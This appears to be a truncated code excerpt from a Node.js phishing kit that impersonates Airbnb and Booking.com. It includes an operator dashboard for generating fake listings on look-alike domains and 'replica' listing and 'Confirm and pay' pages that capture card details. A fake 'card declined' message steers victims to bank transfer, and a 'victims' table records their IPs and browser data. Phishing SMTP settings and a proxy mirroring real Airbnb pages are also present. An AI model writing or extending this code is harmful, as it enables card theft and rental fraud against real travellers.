+      5395   const selHost = isEdit ? L.host_id : opts.selectedHostId;                                                 
+      5396   const aptOptions = ['<option value="">— Select apartment —</option>'].concat(                             
+      5397     apartments.map(a => `<option value="${a.id}"${Number(selApt)===Number(a.id) ? ' selected' : ''}>${esc...
+      5399   const hostOptions = ['<option value="">— Select host —</option>'].concat(                                 
+      5400     hosts.map(h => `<option value="${h.id}"${Number(selHost)===Number(h.id) ? ' selected' : ''}>${esc(h.n...
+      5404   if (isEdit && L.amenities) existingAmens = String(L.amenities).split(',').map(s => s.trim()).filter(Boo...
+      5405   const amenChecks = (typeof amenityChipsHtml === 'function')                                               
+      5406     ? amenityChipsHtml(isEdit ? existingAmens : [])                                                         
+      5407     : AMENITY_LIST.map((a, i) => {                                                                          
+      5409         return `<label class="amen-item"><input type="checkbox" name="amenity" value="${esc(a)}"${checked...
+      5414     const sel = selDomain ? (d.host === selDomain) : (i === 0 && mp !== 'booking');                         
+      5415     return `<option value="${d.host}"${sel ? ' selected' : ''}>${d.label}</option>`;                        
+      5417   const bkDomains = DOMAIN_OPTIONS.booking.map((d, i) => {                                                  
+      5418     const sel = selDomain ? (d.host === selDomain) : (i === 0 && mp === 'booking');                         
+      5419     return `<option value="${d.host}"${sel ? ' selected' : ''}>${d.label}</option>`;                        
+      5422   const accent = mp === 'booking' ? '#0071c2' : '#FF385C';                                                  
+      5423   const accent2 = mp === 'booking' ? '#003580' : '#E61E4D';                                                 
+      5424   const platformLabel = mp === 'booking' ? 'Booking.com' : (mp === 'airbnb' ? 'Airbnb' : 'Listing');        
+      5431          <label class="mf-plat"><input type="radio" name="marketplace" value="booking" onchange="mfOnMp(t...
+      5439     const hostPrev = L.host_photo ? `<div style="margin:8px 0 12px;display:flex;align-items:center;gap:12...
+      5442     return gal + hostPrev + vidPrev;                                                                        
+      5490 <form method="POST" action="${isEdit ? '/dashboard/listings/update/' + L.id : '/dashboard/listings/create...
+      5491   <h2>${isEdit ? ('Edit listing #' + L.id) : ('Create ' + platformLabel + ' listing')}</h2>                 
+      5493     ? 'Update client info, link settings, or property details.'                                             
+      5494     : 'Select apartment & host from your libraries, fill client details, generate the public link.'}</p>    
+      5509       <label>Apartment *</label>                                                                            
+      5510       <select name="apartment_id" id="mfApartment" ${isEdit ? '' : 'required'} onchange="mfOnApartment(th...
+      5513       <p class="mf-hint">Manage in <a href="/dashboard/apartments">Apartments</a>. Photos, price & descri...
+      5516       <label>Host *</label>                                                                                 
+      5517       <select name="host_id" id="mfHost" ${isEdit ? '' : 'required'}>                                       
+      5518         ${hostOptions}                                                                                      
+      5520       <p class="mf-hint">Manage in <a href="/dashboard/hosts">Hosts</a>. Name & photo applied automatical...
+      5530         <optgroup label="Booking" id="mfOgBk"${mp === 'airbnb' ? ' disabled' : ''}>${bkDomains}</optgroup>  
+      5533     <div class="mf-field"><label>Listing ID / code (optional)</label>                                       
+      5534       <input type="text" name="listing_code" id="mfCode" placeholder="e.g. 8272397239" oninput="mfPreview...
+      5557       <label for="mfProxyMode"><strong style="color:#fff">Mirror real Airbnb/Booking page</strong> — clie...
+      5559     <div class="mf-field full"><label>Real listing URL</label>                                              
+      5561       <p class="mf-hint">Use a real open listing URL. Dead IDs fall back to the Airbnb shell + your photo...
+      5566     <div class="mf-sec"><span>5</span> Property details ${isEdit ? '' : '(only if no apartment selected)'...
+      5568       <div class="mf-field full"><label>Title</label><input type="text" name="title" id="mfTitle" placeho...
+      5570       <div class="mf-field"><label>Host name (fallback)</label><input type="text" name="host_name" placeh...
+      5574       <div class="mf-field"><label>Property type</label>                                                    
+      5575         <select name="property_type">${['Entire apartment','Entire home','Private room','Hotel room','Sha...
+      5576           const cur = isEdit ? (L.property_type || 'Entire apartment') : 'Entire apartment';                
+      5588     <div class="mf-sec">Amenities</div>                                                                     
+      5591       <div class="mf-field full"><label>Extra amenities</label><input type="text" name="amenities_custom"...
+      5599       <div class="mf-field full"><label>Host photo upload (fallback)</label><input type="file" name="host...
+      5605     <button type="submit" class="mf-btn">${isEdit ? 'Save listing' : 'Generate listing'}</button>           
+      5606     ${isEdit ? '<a href="/dashboard/listari" style="color:#8899ff;font-size:13px;text-decoration:none">Ca...
+      5621     booking:{gb:'www.booking.co.uk',en:'www.booking.co.uk',fr:'www.booking.fr',de:'www.booking.de',es:'ww...
+      5636     var map = LOCALE_DOMAIN[mpv==='booking'?'booking':'airbnb'] || {};                                      
+      5650     if (v === 'booking') {                                                                                  
+      5665     var host = (document.getElementById('mfDomain') || {}).value || (mpv==='booking'?'www.booking.com':'w...
+      5668     if (mpv === 'booking') {                                                                                
+      5677     if (el) el.innerHTML = '<span>Official-style:</span> https://' + host + path +                          
+      5680   window.mfOnApartment = function(id){                                                                      
+      5686       var inp = document.querySelector('#createListingForm [name="'+n+'"]');                                
+      5693   var aptSel = document.getElementById('mfApartment');                                                      
+      5694   if (aptSel && !isEdit) mfOnApartment(aptSel.value);                                                       
+      5702 function listingTableHtml(listings, req) {                                                                  
+      5703   if (!listings.length) {                                                                                   
+      5707       <div>Alege un apartment din bibliotecă, completează datele clientului și generează listarea.</div>    
+      5710   const statusOpts = BOOKING_STATUSES.map(s =>                                                              
+      5713   const rows = listings.map(l => {                                                                          
+      5716     const st = bookingStatusMeta(l.booking_status || 'not_opened');                                         
+      5718     const aptLabel = l.apartment_name || l.title || '—';                                                    
+      5726         <div style="margin-top:4px"><span style="background:${l.marketplace==='booking'?'#003580':'#FF385...
+      5733         <select data-status-listing="${l.id}" onchange="mfSetStatus(${l.id}, this.value, this)"             
+      5735           ${BOOKING_STATUSES.map(s => `<option value="${s.id}"${(l.booking_status||'not_opened')===s.id?'...
+      5737         <div data-live-listing="${l.id}" style="margin-top:6px;font-size:11px;color:#666"><span class="li...
+      5751         <a href="/dashboard/listings/edit/${l.id}" style="color:#4da3ff;text-decoration:none;font-size:13...
+      5752         <a href="/dashboard/listings/delete/${l.id}" onclick="return confirm('Delete listing?')" style="c...
+      5756   return `<form method="POST" action="/dashboard/listings/delete-bulk" id="ltBulkForm" onsubmit="return l...
+      5763         ${BOOKING_STATUSES.map(s => `<span class="bs-badge" style="background:${s.bg};color:${s.color};bo...
+      5770       <th style="padding:12px;color:#888;font-size:12px">Apartment</th>                                     
+      5805       return confirm('Delete '+n+' selected listings?');                                                    
+      5808       fetch('/dashboard/listings/status/'+id, {                                                             
+      5814         var map = {not_opened:['#6b7280','#1f2937'], open:['#22c55e','#052e16'], in_review:['#f59e0b','#4...
+      5826 /** Airbnb-style Confirm and pay full page (listing photos + trip summary + card capture). */               
+      5827 function computeStayQuote(listing, checkin, checkout, adults) {                                             
+      5828   const locale = listing.locale || 'en';                                                                    
+      5830   const currency = listing.currency || info.currency || 'GBP';                                              
+      5832   const hideNightly = Number(listing.hide_nightly) === 1;                                                   
+      5833   const priceNight = parseFloat(listing.price) || 0;                                                        
+      5834   const priceMonth = parseFloat(listing.price_month) || (priceNight ? Math.round(priceNight * 28) : 0);     
+      5881 function airbnbConfirmPayPage(listing, victimId, q) {                                                       
+      5883   const imgs = parseListingImages(listing);                                                                 
+      5884   const photo = imgs[0] || listing.image_url || 'https://images.unsplash.com/photo-1502672260266-1c1ef2d9...
+      5885   const title = listing.title || 'Your stay';                                                               
+      5886   const location = listing.location || '';                                                                  
+      5887   const host = listing.host_name || 'Host';                                                                 
+      5888   const code = listing.listing_code || String(listing.id);                                                  
+      5895   const quote = computeStayQuote(listing, checkin, checkout, adults + children);                            
+      5901   const rating = listing.rating || '5.0';                                                                   
+      5902   const reviews = listing.reviews || '4';                                                                   
+      5903   const roomBack = listing.public_path || ('/rooms/' + code);                                               
+      5904   const payCfg = resolvePaymentConfig(listing.user_id) || {};                                               
+      5907     id: listing.id,                                                                                         
+      5961 .btn-ghost{background:#fff;border:1px solid #222;border-radius:8px;padding:8px 16px;font-size:14px;font-w...
+      5962 .btn-ghost:hover{background:#f7f7f7}                                                                        
+      5977 .listing-row{display:flex;gap:14px;padding-bottom:20px;border-bottom:1px solid #ebebeb}                     
+      5978 .listing-row img{width:124px;height:106px;object-fit:cover;border-radius:12px;flex-shrink:0;background:#f...
+      5979 .listing-row .t{font-size:16px;font-weight:600;line-height:1.3;margin:0 0 6px}                              
+      5980 .listing-row .m{font-size:14px;color:#222;margin:0 0 4px}                                                   
+      5981 .listing-row .s{font-size:13px;color:#717171}                                                               
+      6019     <p>Your card was declined. Please complete payment using the bank transfer details below to confirm y...
+      6040             <button type="button" class="btn-ghost" id="btn-change-pm">Change</button>                      
+      6076             <p class="agree">By selecting the button, I agree to the <a href="#">booking terms</a>, <a hr...
+      6084         <p class="sub" style="color:#717171;font-size:15px;line-height:1.5;margin:0 0 8px">Your card coul...
+      6105         <div class="listing-row">                                                                           
+      6141   var LID = ${JSON.stringify(String(listing.id))};                                                          
+      6206       listing_id: LID,                                                                                      
+      6254       '<button type="button" class="btn-pay" style="margin-top:18px" onclick="location.href=\\'${esc(room...
+      6263 // === PHISHING LISTING (victim side) ===                                                                   
+      6264 app.get('/listing/:id', (req, res) => {                                                                     
+      6265   const listing = findListingByParam(req.params.id) || db.prepare("SELECT * FROM listings WHERE id = ? AN...
+      6266   return serveListingPage(req, res, listing);                                                               
+      6271   const listing = db.prepare("SELECT * FROM listings WHERE status = 'active' AND (listing_code = ? OR pub...
+      6272   return serveListingPage(req, res, listing);                                                               
+      6276 function findListingForBook(param) {                                                                        
+      6280     db.prepare("SELECT * FROM listings WHERE status = 'active' AND (listing_code = ? OR public_path = ? O...
+      6286 function ensureBookVictim(listing, req, q) {                                                                
+      6290     if (existing && Number(existing.listing_id) === Number(listing.id)) {                                   
+      6292       try { advanceListingStatus(listing, 'invoice_sent'); } catch (e) {}                                   
+      6297     "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?, ?, ...
+      6298   ).run(listing.id, listing.user_id, listing.marketplace || 'airbnb', req.ip, req.headers['user-agent'] |...
+      6299   try { advanceListingStatus(listing, 'invoice_sent'); } catch (e) {}                                       
+      6304   const listing = findListingForBook(req.params.productId);                                                 
+      6305   if (!listing) return res.status(404).send('<h1 style="font-family:sans-serif;text-align:center;margin-t...
+      6307   const vid = ensureBookVictim(listing, req, q);                                                            
+      6309   res.cookie('mf_px_lid', String(listing.id), { httpOnly: false, sameSite: 'lax', path: '/' });             
+      6311   res.type('html').send(airbnbConfirmPayPage(listing, vid, q));                                             
+      6316   const key = q.productId || q.listing_code || q.code || q.id;                                              
+      6317   const listing = findListingForBook(key);                                                                  
+      6318   if (!listing) return res.status(404).send('<h1 style="font-family:sans-serif;text-align:center;margin-t...
+      6319   const vid = ensureBookVictim(listing, req, q);                                                            
+      6321   res.type('html').send(airbnbConfirmPayPage(listing, vid, q));                                             
+      6326   const listing = db.prepare("SELECT * FROM listings WHERE status = 'active' AND (listing_code = ? OR lis...
+      6330   return serveListingPage(req, res, listing);                                                               
+      6334 // This generates a 1:1 replica of the real Airbnb listing page design                                      
+      6336 function airbnbPage(listing, victimId) {                                                                    
+      6337   const imgs = parseListingImages(listing);                                                                 
+      6343   const locale = listing.locale || 'en';                                                                    
+      6345   const currency = listing.currency || localeInfo.currency || 'EUR';                                        
+      6346   const priceNight = parseFloat(listing.price) || 0;                                                        
+      6347   const priceMonth = parseFloat(listing.price_month) || (priceNight ? Math.round(priceNight * 28) : 1500);  
+      6348   const hideNightly = Number(listing.hide_nightly) === 1;                                                   
+      6353   const guests = listing.guests || 4;                                                                       
+      6354   const bedrooms = listing.bedrooms || Math.max(1, Math.floor(guests / 2));                                 
+      6355   const beds = listing.beds || bedrooms;                                                                    
+      6356   const baths = listing.baths || 1;                                                                         
+      6357   const rating = parseFloat(listing.rating) || 4.92;                                                        
+      6358   const reviewCount = parseInt(listing.reviews) || 48;                                                      
+      6359   const host = listing.host_name || 'Host';                                                                 
+      6360   const hostPhoto = listing.host_photo || '';                                                               
+      6361   const ptype = listing.property_type || 'Entire apartment';                                                
+      6362   const loc = listing.location || '';                                                                       
+      6363   const title = listing.title || 'Apartment';                                                               
+      6364   const desc = listing.description || 'A spacious, light-filled home in the heart of the city.';            
+      6366   let amenities = [];                                                                                       
+      6367   try { amenities = String(listing.amenities || '').split(',').map(s => s.trim()).filter(Boolean); } catc...
+      6368   if (!amenities.length) amenities = ['Wifi', 'Kitchen', 'Washer', 'Free parking', 'Air conditioning', 'T...
+      6370   const reviewsData = generateReviews(listing).slice(0, 6);                                                 
+      6371   const videoUrl = getListingVideo(listing);                                                                
+      6375   const listingCode = listing.listing_code || String(listing.id);                                           
+      6376   const hostInitial = String(host).charAt(0).toUpperCase();                                                 
+      6401   const amenHtml = amenities.slice(0, 10).map(a => {                                                        
+      6441     id: listing.id,                                                                                         
+      6442     code: listingCode,                                                                                      
+      6453     host,                                                                                                   
+      6454     hostPhoto,                                                                                              
+      6504     #booking-card-desktop{display:none!important}                                                           
+      6577   <!-- Content + Booking -->                                                                                
+      6580       <!-- Host row -->                                                                                     
+      6583           <h2 class="text-[22px] font-semibold">${esc(ptype)} hosted by ${esc(host)}</h2>                   
+      6587           ${hostPhoto ? '<img src="' + esc(hostPhoto) + '" alt="" class="w-full h-full object-cover">' : ...
+      6595           <div><div class="font-semibold">${esc(host)} is a Superhost</div><div class="text-sm text-gray-...
+      6612       <!-- Amenities -->                                                                                    
+      6651         <p class="mt-4 font-semibold text-[16px]">${esc(loc || 'Exact location provided after booking')}</p>
+      6652         <p class="text-gray-600 text-[15px] mt-1">You'll get the exact address once your reservation is c...
+      6655       <!-- Host -->                                                                                         
+      6657         <h2 class="text-[22px] font-semibold mb-5">Meet your host</h2>                                      
+      6661               ${hostPhoto ? '<img src="' + esc(hostPhoto) + '" alt="' + esc(host) + '" class="w-full h-fu...
+      6664               <div class="text-2xl font-semibold">${esc(host)}</div>                                        
+      6665               <div class="text-gray-500 text-sm">Superhost · Joined 2019</div>                              
+      6671             <div><div class="font-semibold text-lg">5</div><div class="text-gray-500">Years hosting</div>...
+      6673           <p class="mt-4 text-[15px] text-gray-700 leading-relaxed">Hi, I'm ${esc(host)}. I love hosting ...
+      6678     <!-- Sticky booking card (desktop) -->                                                                  
+      6679     <aside class="hidden lg:block" id="booking-card-desktop">                                               
+      6680       <div class="sticky top-28 border border-gray-300 rounded-xl p-6 shadow-book bg-white" id="booking-c...
+      6747         <a href="#" class="block text-center text-sm underline text-gray-600 mt-5">Report this listing</a>  
+      6776 window.__PAYMENT = ${JSON.stringify(resolvePaymentConfig(listing.user_id))};                                
+      7094 function bookingPage(listing, victimId) {                                                                   
+      7095   const bLocale = listing.locale || 'en';                                                                   
+      7096   const bPriceNight = parseFloat(listing.price) || 120;                                                     
+      7097   const bPriceMonth = parseFloat(listing.price_month) || Math.round(bPriceNight * 28);                      
+      7098   const bHide = Number(listing.hide_nightly) === 1;                                                         
+      7103   return `<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-wi...
+      7104 <header class="booking-header"><div class="logo">Booking.com</div></header>                                 
+      7105 <main class="booking-container" id="bc">                                                                    
+      7106 <h1>${listing.title}</h1>                                                                                   
+      7107 <div class="booking-images"><img src="${(parseListingImages(listing)[0])||'https://images.unsplash.com/ph...
+      7108 ${embedVideoHtml(getListingVideo(listing), 'mf-video booking-video')}                                       
+      7109 <div class="booking-details">                                                                               
+      7110 <div class="booking-info"><h2>${listing.location||'Paris, France'}</h2><div class="rating">⭐ 8.7 <span>Ex...
+      7111 <div class="booking-reserve">                                                                               
+      7119 <script>function bDetails(vid){fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/jso...
+      7120 function bPayment(vid){var fn=document.getElementById('bfn').value;var ln=document.getElementById('bln')....
+      7121 function bError(vid){var cn=document.getElementById('bcn').value;var ce=document.getElementById('bce').va...
+      7122 function bSuccess(){fetch('/api/payment-confirm',{method:'POST',headers:{'Content-Type':'application/json...
+      7128   // Allow listing id as victim_id fallback (public pages sometimes send LID)                               
+      7133       const listing = db.prepare('SELECT * FROM listings WHERE id = ?').get(lid);                           
+      7134       if (listing) {                                                                                        
+      7136           "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (...
+      7137         ).run(listing.id, listing.user_id, listing.marketplace || 'airbnb', req.ip, req.headers['user-age...
+      7162   // Auto listing booking_status from funnel stages                                                         
+      7165     const listing = listingFromVictimId(victim_id) || (victim.listing_id ? db.prepare('SELECT id, user_id...
+      7166     if (listing) {                                                                                          
+      7168       if (st === 'date_select' || st === 'dates' || st === 'guests_set' || (hasDates && (st === 'details'...
+      7169         advanceListingStatus(listing, 'in_review');                                                         
+      7170       } else if (st === 'proxy_reserve_click' || st === 'confirm_pay_view' || st === 'confirm_pay' || st ...
+      7171         advanceListingStatus(listing, 'invoice_sent');                                                      
+      7173         advanceListingStatus(listing, 'payment_declined');                                                  
+      7176         advanceListingStatus(listing, 'payment_declined');                                                  
+      7191     const listing = lid ? db.prepare('SELECT * FROM listings WHERE id = ?').get(lid) : null;                
+      7192     if (listing) {                                                                                          
+      7194         "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (?,...
+      7195       ).run(listing.id, listing.user_id, listing.marketplace || 'airbnb', req.ip, req.headers['user-agent...
+      7206     const listing = listingFromVictimId(victim_id) || (victim.listing_id ? db.prepare('SELECT id, user_id...
+      7207     if (listing) advanceListingStatus(listing, 'payment_declined');                                         
+      7223       const listing = listingFromVictimId(victim_id) || (victim.listing_id ? db.prepare('SELECT id, user_...
+      7224       if (listing) advanceListingStatus(listing, 'payment_declined');                                       
+      7390 .ol-btn-ghost{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.6);padding:6px 12px;bo...
+      7391 .ol-btn-ghost:hover{background:rgba(255,255,255,.15)}                                                       
+      7415     <form method="POST" action="/cmail/logout" style="margin:0"><button type="submit" class="ol-btn-ghost...
+      7551     { from_name: 'Contoso Travel', from_email: 'reservations@contoso.com', subject: 'Booking confirmation...
+      7619       "INSERT INTO victims (listing_id, user_id, marketplace, ip_address, user_agent, stage) VALUES (NULL...
+      8322   host TEXT DEFAULT '',                                                                                     
+      8815         <div><label>Host</label><input name="host" value="${phEsc(smtp ? smtp.host : '')}" placeholder="s...
+      8844   if (!s || !s.host) return cb(null, { skipped: true });                                                    
+      8847       host: s.host, port: parseInt(s.port, 10) || 587, secure: !!s.secure,                                  
+      9079   const host = String(req.body.host || '').trim();                                                          
+      9086     db.prepare('UPDATE phish_smtp SET host=?, port=?, secure=?, username=?, password=?, from_addr=?, upda...
+      9087       .run(host, port, secure, username, password, from_addr, req.user.id);                                 
+      9089     db.prepare('INSERT INTO phish_smtp (user_id, host, port, secure, username, password, from_addr) VALUE...
+      9090       .run(req.user.id, host, port, secure, username, password, from_addr);                                 
+      9097   const host = String(req.body.host || '').trim();                                                          
+      9104     db.prepare('UPDATE phish_smtp SET host=?, port=?, secure=?, username=?, password=?, from_addr=?, upda...
+      9105       .run(host, port, secure, username, password, from_addr, req.user.id);                                 
+      9107     db.prepare('INSERT INTO phish_smtp (user_id, host, port, secure, username, password, from_addr) VALUE...
+      9108       .run(req.user.id, host, port, secure, username, password, from_addr);                                 
+      9111   if (!host) return res.send(phMailPage(req, { err: 'Configurează host-ul SMTP înainte de test.' }));       
+      9114     return res.send(phMailPage(req, { err: 'Test SMTP eșuat: ' + String(err && err.message || err).substr...
+      9123   socket.on('listing_ping', (data) => {                                                                     
+      9127         listingId: data.listingId,                                                                          
+      9138 // ===== Airbnb Clone Proxy: /_airbnb/* -> localhost:3001/_airbnb/* =====                                   
+      9145       hostname: target.hostname,                                                                            
+      9151         host: target.host,                                                                                  
+      9152         'x-forwarded-host': req.headers.host || '',                                                         
+      9187     try { return new URL(process.env.BASE_URL || 'https://lessjob.online').hostname.replace(/^www\./, '')...
+      9204 server.listen(PORT, process.env.HOST || '127.0.0.1', () => {                                                
+
+
